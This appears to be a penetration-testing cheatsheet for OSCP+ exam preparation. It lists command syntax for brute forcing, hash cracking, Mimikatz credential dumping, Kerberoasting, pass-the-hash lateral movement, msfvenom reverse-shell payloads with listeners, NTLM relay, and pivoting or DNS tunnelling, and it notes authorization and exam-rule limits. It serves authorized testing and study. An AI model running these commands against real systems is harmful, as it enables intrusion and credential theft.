> Prefer password prompting instead of retained shell history. `/pth` invokes Restricted Admin behavior: the target must permit it and the identity must be an administrator. Ordinary RDP instead needs an effective remote-interactive logon right. [RDP procedure](../reference/03-initial-access/01-rdp-access.md) and [lateral movement](../reference/06-ad-lateral-movement/05-lateral-movement.md)

## Credential tools

### Hydra

Use only after explicit authorization, a confirmed endpoint, known usernames and lockout/rate-limit review.

```bash
hydra -l USER -P PASSWORDS -s PORT ssh://TARGET -t 4 -f
hydra -L USERS -p ONE_PASSWORD -s PORT ftp://TARGET -t 4 -f
```

HTTP form syntax depends on the exact request and failure marker:

```bash
hydra -l USER -P PASSWORDS TARGET http-post-form \
  '/login:username=^USER^&password=^PASS^:F=Invalid credentials'
```

> Capture the form with Burp/curl first. Stop on lockout/rate-limit evidence. Password spraying is not the same as brute forcing.

### Hashcat and John

```bash
hashcat -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m MODE hashes.txt --show
john --format=FORMAT --wordlist=wordlist.txt --rules=Jumbo hash.txt
john --show hash.txt
```

> [Credential cheatsheet](credentials-cracking.md)

## Local privilege-escalation tools

### LinPEAS, LSE and unix-privesc-check

```bash
./linpeas.sh | tee linpeas.txt
./lse.sh | tee lse.txt
./lse.sh -l1 | tee lse-l1.txt
./unix-privesc-check standard > unix-privesc-check.txt
```

> Generate candidates, then prove the exact object, effective permission, privileged consumer, identity and trigger. LinPEAS `-a` is intentionally not the baseline: upstream documents longer/noisier checks including process monitoring and password attempts. LSE `-l2` and `unix-privesc-check detailed` are later depth. [Linux procedure](../reference/05-local-privilege-escalation/01-linux-privilege-escalation.md)

### pspy

```bash
./pspy64
./pspy64 -pf -i 1000
```

> Default output watches processes; `-f` adds filesystem events and `-i 1000` scans procfs every second. An observed UID/command proves execution, not control over its inputs. [Linux procedure](../reference/05-local-privilege-escalation/01-linux-privilege-escalation.md#6-cron-timers-and-services)

### Responder and NTLM relay

```bash
sudo responder -I INTERFACE
impacket-ntlmrelayx -tf targets.txt -smb2support
```

> Authorized labs only: poisoning/spoofing is prohibited by the current OSCP+ exam guide. Relay additionally requires a victim authentication event, reachable compatible target and protections/configuration that permit relay. Do not use as a default credential step.

## Active Directory tools

### PowerView

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
Get-DomainUser -SPN
Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs
```

### Mimikatz

```text
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
lsadump::sam
```

> Requires suitable local privilege/protection state. Treat output as sensitive. [Credential-access procedure](../reference/06-ad-lateral-movement/02-credential-access.md)

### Rubeus

```cmd
Rubeus.exe triage
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe kerberoast /nowrap /outfile:kerberoast.txt
Rubeus.exe ptt /ticket:ticket.kirbi
```

> [Kerberos procedure](../reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions.md)

### NetExec / CrackMapExec

```bash
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD'
nxc smb TARGET -d DOMAIN -u USER -H NT_HASH
nxc smb TARGET -u Administrator -H NT_HASH --local-auth
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' -x "hostname & whoami" --exec-method wmiexec
nxc winrm TARGET -d DOMAIN -u USER -p 'PASSWORD'
```

> Prefer the maintained `nxc`; older installations may expose `crackmapexec`. `(Pwn3d!)` is an SMB admin-context cue, not universal execution proof. Current SMB execution methods include `wmiexec`, `atexec` and `smbexec`; force one while diagnosing instead of hiding method-specific failure behind fallback.

### Impacket suite

```bash
impacket-GetNPUsers DOMAIN/ -no-pass -request -usersfile users.txt -dc-ip DC_IP -outputfile asrep.txt
impacket-GetUserSPNs -request -dc-ip DC_IP -outputfile tgs.txt 'DOMAIN/USER:PASSWORD'
impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET'
impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
impacket-smbexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
impacket-atexec -hashes :NT_HASH 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami"
impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
impacket-dcomexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
impacket-mssqlclient 'DOMAIN/USER:PASSWORD@TARGET' -windows-auth
```

Kerberos cache with separate naming and routing:

```bash
export KRB5CCNAME="$PWD/USER.ccache"
impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'
impacket-psexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'
```

> Script names may include or omit the `impacket-` prefix by package. Inspect `-h` locally. Use the SPN-matching hostname in the target string and `-target-ip` for routing. Current Impacket DCOMExec rejects Kerberos; use WMIExec for that context. [AD procedures](../reference/06-ad-lateral-movement/README.md)

### Evil-WinRM, WinRS and PowerShell remoting

```bash
evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD'
evil-winrm -i TARGET_HOST -u USER -H NT_HASH
evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' -S -P 5986
evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP
```

```cmd
winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname & whoami"
```

```powershell
Test-WSMan TARGET_HOST
$Credential = Get-Credential 'DOMAIN\USER'
Invoke-Command -ComputerName TARGET_HOST -Credential $Credential -ScriptBlock { hostname; whoami /all }
```

> Needs an enabled 5985/5986 listener and endpoint authorization. Kerberos uses the target FQDN/SPN. IP-based PowerShell remoting requires explicit credentials and normally HTTPS or a tightly scoped TrustedHosts entry; do not weaken global trust to disguise a DNS/SPN error. [Lateral movement](../reference/06-ad-lateral-movement/05-lateral-movement.md)

### BloodHound and SharpHound

```powershell
.\SharpHound.exe -c All --zipfilename sharphound.zip
```

```bash
bloodhound-python -u USER -p 'PASSWORD' -d DOMAIN -ns DC_IP -dc DC_HOST -c All --zip
```

> Collection/ingestion versions must match. Validate chosen edges manually.

### Certipy

```bash
certipy-ad find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -enabled -vulnerable -stdout
certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -target DC_HOST -ca CA_NAME -template TEMPLATE
certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP
```

> Some packages expose `certipy` instead of `certipy-ad`. [AD CS procedure](../reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md)

## Web exploitation tools

### SQLmap

```bash
# Lab/reference only; prohibited on the OSCP+ exam
sqlmap -r request.txt --batch --dbs
```

> Preserve only as a lab/research comparator. Use [manual SQL injection](../reference/03-initial-access/03-command-and-sql-injection.md) for exam preparation.

### WPScan

```bash
wpscan --url https://HOSTNAME/ --disable-tls-checks --enumerate vp,vt,u --plugins-detection mixed -o wpscan.txt
```

> Verify active component/version and configuration manually. [WordPress procedure](../reference/03-initial-access/05-wordpress-and-ssrf.md)

## Payload and pivot tools

### SearchSploit and exploit toolchains

```bash
searchsploit --cve CVE
searchsploit -t "PRODUCT VERSION"
searchsploit PRODUCT VERSION --exclude="/dos/"
searchsploit -x EDB_ID
searchsploit -m EDB_ID
```

```bash
python3 -m py_compile exploit.py
gcc -Wall -Wextra exploit.c -o exploit
i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe -lws2_32
x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe -lws2_32
file exploit exploit-x86.exe exploit-x64.exe
```

> Audit source first; match exact prerequisites; compile for where the exploit program runs and generate payloads for the target execution context. [Public exploit procedure](../reference/03-initial-access/06-public-exploit-adaptation.md)

### msfvenom, multi/handler and Netcat

```bash
msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86'
msfvenom --list formats
msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe
rlwrap nc -lvnp LPORT
ncat -4 -lvn 0.0.0.0 LPORT
```

```text
msfconsole -q
use exploit/multi/handler
set PAYLOAD PAYLOAD_NAME
set LHOST LHOST
set LPORT LPORT
set ExitOnSession false
show options
run -j
jobs -l
sessions -l
sessions -i SESSION_ID
```

> `nc` and Nmap Ncat have different option conventions. A staged name such as `shell/reverse_tcp` needs an exact staging handler; `shell_reverse_tcp` is the common stageless form. `msfvenom` and `multi/handler` have across-target exam exceptions, but Meterpreter remains one-target restricted. [Shell procedure](../reference/04-shells-transfers-credentials/02-shells-and-payloads.md) and [payload diagnosis](../reference/04-shells-transfers-credentials/06-payload-execution-obstacles.md)

### Windows payload-control evidence

```powershell
Get-ExecutionPolicy -List
$ExecutionContext.SessionState.LanguageMode
Get-MpComputerStatus |
  Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled
Get-MpThreatDetection |
  Select-Object InitialDetectionTime,ThreatID,ActionSuccess,Resources
Get-AppLockerPolicy -Effective -Xml
Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -MaxEvents 50
Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' -MaxEvents 50
Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/MSI and Script' -MaxEvents 50
```

> Separate execution policy, language mode, AMSI, application control, antimalware, permissions and architecture. Missing cmdlets/logs are inconclusive. [Payload diagnosis](../reference/04-shells-transfers-credentials/06-payload-execution-obstacles.md)

### Metasploit restricted module workflow

```text
search type:exploit cve:CVE_ID
info MODULE_PATH
use MODULE_PATH
show options
show advanced
show targets
show payloads
set RHOSTS TARGET
set RPORT PORT
set TARGET TARGET_ID
set PAYLOAD PAYLOAD_NAME
show missing
run
```

> Auxiliary, Exploit or Post modules—or Meterpreter—lock use to one selected exam target even if `check` or the attempt fails. Metasploit pivoting and automatic exploitation are prohibited. Module rank is not vulnerability proof.

### SSH forwarding and ProxyChains

```bash
ssh -N -L 127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT -p SSH_PORT USER@PIVOT -o ExitOnForwardFailure=yes
ssh -N -D 127.0.0.1:1080 -p SSH_PORT USER@PIVOT -o ExitOnForwardFailure=yes
ssh -N -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT -p KALI_SSH_PORT KALI_USER@LHOST -o ExitOnForwardFailure=yes
ssh -N -R 127.0.0.1:1080 -p KALI_SSH_PORT KALI_USER@LHOST -o ExitOnForwardFailure=yes
ssh -J PIVOT_USER@PIVOT TARGET_USER@INTERNAL_HOST

proxychains4 -q -f ./proxychains-pivot.conf nmap -sT -Pn -n -p PORTS INTERNAL_HOST
curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_HOST:PORT/
```

> `-L`/`-D` listen on the SSH client; `-R` listens on the SSH server. ProxyChains is TCP-only and cannot carry SYN/ICMP/UDP/pcap operations. [Pivoting procedure](../reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md)

### Socat, sshuttle and Windows relays

```bash
socat -ddd TCP-LISTEN:LOCAL_PORT,bind=PIVOT_REACHABLE_IP,reuseaddr,fork TCP:INTERNAL_HOST:INTERNAL_PORT
sudo sshuttle --dns -r SSH_USER@PIVOT:SSH_PORT INTERNAL_SUBNET
```

```cmd
plink.exe -ssh -N -batch -hostkey "HOST_KEY_FINGERPRINT" -l KALI_USER -pwfile C:\PATH\kali-password.txt -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT -P KALI_SSH_PORT LHOST
netsh interface portproxy add v4tov4 listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT connectaddress=INTERNAL_HOST connectport=INTERNAL_PORT
netsh interface portproxy show all
```

> Socat is a clear fixed relay. sshuttle creates a selected-subnet TCP/DNS-oriented route. Netsh is elevated, persistent and TCP-only; record firewall changes and cleanup.

### Chisel and Ligolo-ng

```bash
chisel server --reverse --port CHISEL_PORT
chisel client --fingerprint 'SERVER_FINGERPRINT' LHOST:CHISEL_PORT R:127.0.0.1:1080:socks

./proxy -selfcert -laddr 0.0.0.0:LIGOLO_PORT
./agent -connect LHOST:LIGOLO_PORT -accept-fingerprint CERT_FINGERPRINT
```

Ligolo console:

```text
interface_create --name ligolo
session
interface_add_route --name ligolo --route INTERNAL_SUBNET
tunnel_start --tun ligolo
listener_add --addr 0.0.0.0:PIVOT_PORT --to 127.0.0.1:KALI_PORT --tcp
```

> Current Chisel `socks` is TCP CONNECT; `udpsocks` adds SOCKS5 UDP ASSOCIATE for compatible current peers/clients. This does not add UDP support to ProxyChains. Ligolo supplies routed access; agent listeners handle reverse callbacks. [Pivoting procedure](../reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md)

### dnscat2

```bash
dnscat2-server --secret=SHARED_SECRET TUNNEL_DOMAIN
./dnscat --secret=SHARED_SECRET TUNNEL_DOMAIN
./dnscat --dns server=DNS_SERVER,port=53 --secret=SHARED_SECRET
```

> Conditional DNS-only route requiring client execution and authoritative delegation or direct DNS-server reachability. Validate the resolver path before the encrypted session.

### Evidence capture and final report package

```bash
mkdir -p evidence/{nmap,web,loot,sessions,screenshots}
script -q -f evidence/session.txt
# Run the intended commands, then exit to close/flush the transcript.
sha256sum FILE | tee FILE.sha256

7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf
7z l OSCP-OS-XXXXX-Exam-Report.7z
7z t OSCP-OS-XXXXX-Exam-Report.7z
md5sum OSCP-OS-XXXXX-Exam-Report.7z
```

```powershell
Start-Transcript -Path .\evidence\powershell-session.txt
Get-FileHash -Algorithm SHA256 -LiteralPath '.\FILE'
Get-FileHash -Algorithm MD5 -LiteralPath '.\OSCP-OS-XXXXX-Exam-Report.7z'
Stop-Transcript
```

> A transcript supports reproduction but is not the final narrative. Recheck the current guide, inspect every PDF page, confirm the archive contains only the correctly named PDF, compare the local/upload MD5 and complete final submission. [Integrated evidence procedure](../reference/08-evidence-reporting/01-attack-tracking-and-evidence.md)

## Sources

- [getSH Tool Cheatsheet](https://lizajose.github.io/getSH/tool-cheatsheet), source snapshot [`e1f62dd`](https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98)
- Linked upstream/project documentation in each canonical procedure
- [Current OSCP+ exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)

pages.markdown:
# Tool Selection Matrix

[← Cheatsheet index](README.md) | [getSH coverage map](../notes/GetSH_Coverage.md) | [Strategy map](../notes/Attack_Strategy_Map.md)

Choose the smallest tool that answers the current question. Automated output is a candidate list unless the tool directly verifies the required effect.

| Question | Baseline | Alternative | Decisive output / failure cue |
| --- | --- | --- | --- |
| Which TCP ports respond? | Nmap | RustScan/Masscan then Nmap validation | Reproducible open state; fast-tool-only hit remains unconfirmed |
| What application is present? | Nmap `-sV`, native client | Netcat/curl/OpenSSL | Protocol behavior/banner; port label alone is weak |
| What web paths/vhosts exist? | Browser/Burp + ffuf | Gobuster/Feroxbuster/wfuzz | Response differs from random baseline |
| Common web-server candidates? | Manual mapping | Nikto | Manually reproduced finding |
| Public exploit candidate? | SearchSploit/source review | Exploit-DB/vendor advisory/repository | Exact component/prerequisites plus independently verified effect |
| WordPress components/users? | Manual source/path checks | WPScan | Active component/version/user candidate manually confirmed |
| SMB shares/rights? | `smbclient`, RPC | NetExec | Exact share/object read/write result |
| LDAP objects? | `ldapsearch` | PowerView/AD module | Returned object/attribute in stated auth context |
| Domain path candidates? | Native/PowerView | BloodHound/SharpHound | Chosen edge manually validated |
| Kerberos roastable material? | Impacket/Rubeus | PowerView ticket request | Hash output whose type is identified |
| Password recovery? | Hashcat | John | Recovered candidate revalidated against correct context |
| Local privesc candidates? | Manual OS checks | LinPEAS/WinPEAS/LSE/PowerUp | Controlled object + privileged consumer + trigger |
| Remote Windows execution? | WinRM/WMI/SMB based on prerequisites | RDP/DCOM | Verified remote host/identity/effect |
| AD CS paths? | Certipy enumeration | Manual directory/template review | Specific enabled template/CA and effective rights |
| One internal TCP service? | SSH `-L`/`-R` | Socat, Plink or Netsh | Bound listener plus protocol client reaches exact endpoint |
| Several internal TCP services? | SSH SOCKS | Chisel reverse SOCKS | Focused TCP client reaches intended endpoint through named proxy |
| Routed pivot? | Ligolo-ng | sshuttle or explicit forwards | Route exists and native client reaches endpoint |
| DNS-only egress? | Prove resolver/authority path | dnscat2 | Authenticated session; query arrival alone is insufficient |
| Payload generation? | Handwritten/native command | msfvenom | Format/architecture/staged state match and execution/callback separately verified |
| Payload/document does not execute? | State ladder + native format/policy/log checks | Packet capture and exact matching handler | First failed delivery/trigger/parser/execution/connection/handler boundary |
| Staged/framework callback? | Exact `multi/handler` | Compatible stageless command shell + raw listener | Session opens with expected payload; TCP alone is insufficient |
| Which attack path next? | Coverage + hypothesis queues | Graph/board view of the same state | One prerequisite-testing action whose outcomes change the decision |
| Final report package? | Official Word/LibreOffice template + `7z` | Rehearsed Markdown/Pandoc workflow | Reviewed PDF, archive test passes and local/upload MD5 match |

## Exam-rule flags

- Impact alone does not make a manual command prohibited. LSASS/SAM/NTDS collection, web/OS command execution, privilege escalation, ticket operations and lateral movement remain referenceable when used only on assigned systems with the required rights and objective. The chosen tool feature still must not perform a prohibited function.
- SQLmap and similar automatic exploitation tools: prohibited by the current OSCP+ guide; use manual SQLi procedures.
- Responder poisoning/spoofing: spoofing is prohibited by the current guide; lab concept only unless rules explicitly change.
- Metasploit/Meterpreter: restricted to one selected target; `msfvenom` and `multi/handler` have specific exceptions in the current guide.
- Metasploit pivoting: explicitly prohibited by the current guide.
- Commercial tools/services and mass vulnerability scanners are prohibited. Use free/manual task-specific tools and verify their exact feature behavior.
- AI chatbots and direct-prompt LLM use are prohibited during the exam and reporting phase. Use this repository offline without Codex or another chatbot.
- Nmap/NSE, Nikto and Burp Free are explicitly listed as permitted in the current guide, but tool features performing prohibited functions remain prohibited.

Always recheck the [current official guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) before a mock or exam.

# Tools and scripts by task

[Cheatsheet index](README.md) | [Operational index](../README.md)

Choose a task, then use its complete commands and conditions. Tool links open the upstream source/documentation; they do not install anything.

[Enumeration toolkit](../notes/Automation_Toolkit.md) — established multi-check collectors by stage, recommended foundations and feature-specific review boundaries.

## Quick lookup

| Tool / script | Choose it for | Procedure |
| --- | --- | --- |
| [Nmap](https://nmap.org/book/man.html) | Full TCP coverage; identify applications on the ports found. | [Discover TCP ports with SYN or connect scans](../reference/01-discovery-scanning/02-tcp-scanning.md) |
| [Enumeration toolkit launchers](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/tree/main/scripts/enum-toolkit) | Run explicit upstream-tool profiles by stage; retain raw reports and command provenance without automatic exploitation. | [Discover TCP ports with SYN or connect scans](../reference/01-discovery-scanning/02-tcp-scanning.md) |
| [Nmap UDP](https://nmap.org/book/scan-methods-udp-scan.html) | Keep UDP results and ambiguous silence separate from TCP. | [Probe UDP and resolve ambiguous silence](../reference/01-discovery-scanning/04-udp-scanning.md) |
| [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) | List shares, then read files in the accepted identity. | [Enumerate SMB/RPC shares, files and identities](../reference/02-service-enumeration/06-smb-rpc.md) |
| [SMBMap](https://github.com/ShawnDEvans/smbmap) | Map share rights and retrieve one useful file. | [Enumerate SMB/RPC shares, files and identities](../reference/02-service-enumeration/06-smb-rpc.md) |
| [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) | Collect SMB/RPC candidates with anonymous or known credentials. | [Enumerate SMB/RPC shares, files and identities](../reference/02-service-enumeration/06-smb-rpc.md) |
| [snmpwalk](https://www.net-snmp.org/docs/man/snmpwalk.html) | Query an observed community/version for configuration leads. | [Extract configuration and process information through SNMP](../reference/02-service-enumeration/07-snmp.md) |
| [dig](https://bind9.readthedocs.io/en/latest/manpages.html) | Resolve names and test authorized zone-transfer conditions. | [Expand names through DNS records and zone transfers](../reference/02-service-enumeration/04-dns.md) |
| [impacket-mssqlclient](https://github.com/fortra/impacket) | Inspect SQL Server login, grants and enabled operations. | [Use SQL Server rights, impersonation and command facilities](../reference/02-service-enumeration/08-databases.md) |
| [curl](https://curl.se/docs/manpage.html) | Replay the real host, method, cookie and input. | [Establish scheme, host, redirects and request state](../reference/02-service-enumeration/10-http-web-mapping.md) |
| [Gobuster](https://github.com/OJ/gobuster) | Discover paths after measuring a missing-path response. | [Discover directories and files with controlled response filtering](../reference/02-service-enumeration/10-http-web-mapping.md) |
| [ffuf](https://github.com/ffuf/ffuf) | Fuzz one boundary in a valid request; preserve its session. | [Map parameters, API methods, objects and writable properties](../reference/02-service-enumeration/10-http-web-mapping.md) |
| [Burp Suite](https://portswigger.net/burp/documentation/desktop) | Capture and compare normal requests before modifying inputs. | [Map functions, roles and normal requests manually](../reference/02-service-enumeration/10-http-web-mapping.md) |
| [WPScan](https://github.com/wpscanteam/wpscan) | Use only after confirming WordPress and relevant components. | [Use WordPress component evidence and authorized administration features](../reference/03-initial-access/05-wordpress-and-ssrf.md) |
| [curl request tests](https://curl.se/docs/manpage.html) | Prove the command/parser effect before choosing a session. | [Prove visible or blind operating-system command injection](../reference/03-initial-access/03-command-and-sql-injection.md) |
| [Hashcat](https://hashcat.net/wiki/) | Select the identified artifact format and feasible candidate strategy. | [Recover passwords with feasible dictionary, rule and mask attacks](../reference/04-shells-transfers-credentials/03-credential-use-and-cracking.md) |
| [John the Ripper](https://www.openwall.com/john/doc/) | Extract a supported verifier, recover offline, then validate access. | [Recover passwords with feasible dictionary, rule and mask attacks](../reference/04-shells-transfers-credentials/03-credential-use-and-cracking.md) |
| [RunasCs](https://github.com/antonioCoco/RunasCs) | Use known plaintext credentials from an existing Windows shell. | [Validate known passwords and context-specific reuse](../reference/04-shells-transfers-credentials/03-credential-use-and-cracking.md) |
| [SearchSploit](https://www.exploit-db.com/searchsploit) | Find and inspect a PoC matching the exact feature/configuration. | [Match a public exploit to the actual component and configuration](../reference/03-initial-access/06-public-exploit-adaptation.md) |
| [Python venv](https://docs.python.org/3/library/venv.html) | Separate local runtime/dependency errors from target rejection. | [Audit a PoC and reproduce its interpreter/dependency environment](../reference/03-initial-access/06-public-exploit-adaptation.md) |
| [GCC](https://gcc.gnu.org/onlinedocs/) | Match process architecture, ABI and required libraries. | [Compile and minimally adapt an existing native or memory-corruption PoC](../reference/03-initial-access/06-public-exploit-adaptation.md) |
| [SCP](https://man.openbsd.org/scp) | Move files when authenticated SSH is the reachable channel. | [Copy files through an authenticated SSH service](../reference/04-shells-transfers-credentials/01-file-transfer.md) |
| [Python HTTP server](https://docs.python.org/3/library/http.server.html) | Transfer a reviewed artifact over a reachable HTTP leg. | [Transfer over HTTP using Linux or Windows clients](../reference/04-shells-transfers-credentials/01-file-transfer.md) |
| [PTY / stty](https://docs.python.org/3/library/pty.html) | Stabilize an existing command session; retain the original channel. | [Repair a limited Linux terminal](../reference/04-shells-transfers-credentials/02-shells-and-payloads.md) |
| [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) | Early Linux candidate collection, followed by exact-object checks. | [Use enumeration tools to generate manually testable candidates](../reference/05-local-privilege-escalation/01-linux-privilege-escalation.md) |
| [pspy](https://github.com/DominicBreuker/pspy) | Observe transient privileged consumers and their real commands. | [Control a script, binary or configuration consumed by a privileged job/service](../reference/05-local-privilege-escalation/01-linux-privilege-escalation.md) |
| [GTFOBins](https://gtfobins.github.io/) | Match the exact binary, rule and privilege-preserving mode. | [Use an allowed sudo operation to cross a privilege boundary](../reference/05-local-privilege-escalation/01-linux-privilege-escalation.md) |
| [getcap / capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) | Connect an effective file capability to an available operation. | [Use a file capability that enables a specific privileged operation](../reference/05-local-privilege-escalation/01-linux-privilege-escalation.md) |
| [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) | Early Windows candidate collection; inspect out.txt. | [Turn automated Windows findings into manually verified candidates](../reference/05-local-privilege-escalation/02-windows-privilege-escalation.md) |
| [Seatbelt](https://github.com/GhostPack/Seatbelt) | Choose a focused system or current-user survey. | [Turn automated Windows findings into manually verified candidates](../reference/05-local-privilege-escalation/02-windows-privilege-escalation.md) |
| [PrivescCheck](https://github.com/itm4n/PrivescCheck) | Check permissions in the current token, with readable reports. | [Turn automated Windows findings into manually verified candidates](../reference/05-local-privilege-escalation/02-windows-privilege-escalation.md) |
| [LaZagne](https://github.com/AlessandroZ/LaZagne) | Recover supported application stores in the accessible user context. | [Recover Windows application, history and stored-credential artifacts](../reference/05-local-privilege-escalation/02-windows-privilege-escalation.md) |
| [SharpHound / BloodHound CE](https://bloodhound.specterops.io/) | Collect compatible graph data and validate the useful edge. | [Collect focused BloodHound data and validate an attack path](../reference/06-ad-lateral-movement/01-domain-mapping.md) |
| [NetExec](https://www.netexec.wiki/) | Validate domain identity and service-specific authorization. | [Establish domain identity, DC, DNS, time and route](../reference/06-ad-lateral-movement/01-domain-mapping.md) |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) | Inspect directory objects/rights from the current Windows context. | [Enumerate directory objects with native, LDAP and PowerView approaches](../reference/06-ad-lateral-movement/01-domain-mapping.md) |
| [AD surface helpers](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/tree/main/scripts/ad-map) | Automatically collect scoped LDAP/current-host evidence and summarize candidate clues with manual prerequisite checks; -Preview is optional. | [Enumerate directory objects with native, LDAP and PowerView approaches](../reference/06-ad-lateral-movement/01-domain-mapping.md) |
| [Impacket Kerberos tools](https://github.com/fortra/impacket) | Use the matching identity, SPN and ticket-request prerequisites. | [Request a selected service ticket for offline service-account recovery](../reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions.md) |
| [Rubeus](https://github.com/GhostPack/Rubeus) | Inventory ticket contexts before using a selected ticket. | [Inventory, convert and import tickets in the correct logon context](../reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions.md) |
| [Certipy](https://github.com/ly4k/Certipy) | Inspect AD CS prerequisites before a certificate-based transition. | [Conditional: validate an AD CS enrollment-to-authentication path](../reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md) |
| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | Use when the accepted identity has WinRM authorization. | [Use WinRM, WinRS or PowerShell remoting](../reference/06-ad-lateral-movement/05-lateral-movement.md) |
| [Impacket WMI](https://github.com/fortra/impacket) | Use a permitted WMI/RPC path with the matching authentication material. | [Execute through WMI or native CIM over DCOM](../reference/06-ad-lateral-movement/05-lateral-movement.md) |
| [FreeRDP](https://www.freerdp.com/) | Check remote interactive rights and preserve the current session. | [Obtain an authorized RDP interactive session](../reference/06-ad-lateral-movement/05-lateral-movement.md) |
| [SSH forwards](https://man.openbsd.org/ssh) | Choose the listening side and destination leg explicitly. | [Forward a selected service through an SSH client-side listener](../reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md) |
| [Chisel](https://github.com/jpillora/chisel) | Use a reverse transport when the pivot can reach your listener. | [Use a reverse Chisel SOCKS or fixed TCP tunnel](../reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md) |
| [Ligolo-ng](https://docs.ligolo.ng/) | Route only the intended internal prefixes through the working agent. | [Route a selected internal subnet through Ligolo-ng](../reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md) |
| [ProxyChains-NG](https://github.com/rofl0r/proxychains-ng) | Use compatible TCP clients through a verified SOCKS listener. | [Use ProxyChains, native SOCKS clients and SSH jump paths appropriately](../reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md) |
| [Metasploit handler](https://docs.metasploit.com/) | Match payload transport, architecture and listener; inspect framework limits. | [Pair staged payloads with the correct handler and session lifecycle](../reference/04-shells-transfers-credentials/06-payload-execution-obstacles.md) |
| [PowerShell](https://learn.microsoft.com/en-us/powershell/) | Distinguish parsing, policy, runtime and process architecture failures. | [Distinguish PowerShell policy, language mode and protected execution layers](../reference/04-shells-transfers-credentials/06-payload-execution-obstacles.md) |
| [file / readelf](https://sourceware.org/binutils/docs/binutils/readelf.html) | Check format and ABI before changing a payload. | [Match an artifact to its executable consumer and runtime](../reference/04-shells-transfers-credentials/06-payload-execution-obstacles.md) |
| [Native identity proof](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami) | Record host/identity and the exact capability change. | [Capture state-transition, proof and exploit-adaptation evidence](../reference/08-evidence-reporting/01-attack-tracking-and-evidence.md) |

## Further reference

The command-first organization and gap review were informed by [0xsyr0/OSCP](https://github.com/0xsyr0/OSCP). Commands and interpretations here are maintained against the linked upstream documentation and our owning procedures. Full exploit files remain at their upstream locations; no third-party repository is mirrored here.
